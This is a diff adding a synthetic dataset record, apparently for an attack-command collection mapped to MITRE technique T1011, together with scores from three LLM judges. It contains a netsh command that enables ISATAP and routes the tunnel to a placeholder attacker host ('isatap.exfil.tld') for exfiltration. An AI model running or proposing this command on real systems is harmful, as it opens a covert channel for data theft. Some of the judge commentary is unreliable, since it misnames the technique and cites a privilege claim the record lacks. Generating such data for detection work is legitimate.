@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface isatap set state state=enabled; netsh interface isatap set router isatap.exfil.tld",
+  "explanation": "Activates ISATAP and points it to a custom router, enabling IPv6-in-IPv4 tunneling as an alternate medium suitable for exfiltration (T1011).",
+  "rationale_steps": [
+    "Enable ISATAP to encapsulate IPv6 over IPv4, creating a distinct communication path.",
+    "Direct the tunnel to an attacker-controlled ISATAP router.",
+    "Use the tunnel to transfer data over IPv6 where monitoring may be weaker."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-7845b056",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for netsh commands, correct use of semicolon as a command separator, and valid parameter formats.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements IPv6-in-IPv4 tunneling via ISATAP which could be used for exfiltration (T1011), but the technique ID T1011 actually refers to 'Exfiltration Over Other Network Medium' which is aligned but not perfectly matched.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:31:48.240787Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct `netsh` syntax and a valid command separator for sequential execution.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command correctly enables ISATAP, it is fundamentally misaligned with the T1011 'Establish Accounts' technique and incorrectly states that it requires 'None' privilege, as `netsh interface` modifications typically require Administrator rights.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:32:02.783908Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Two well-formed netsh commands separated by a semicolon with valid subcontexts and parameters.",
+        "semantic_score": 3,
+        "semantic_justification": "Enabling ISATAP and setting a custom router could provide an alternate IPv6-in-IPv4 channel for exfiltration, but on Windows it typically requires administrator privileges and ISATAP is often disabled/deprecated, contradicting the 'Privilege: None' claim.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T10:32:52.490362Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
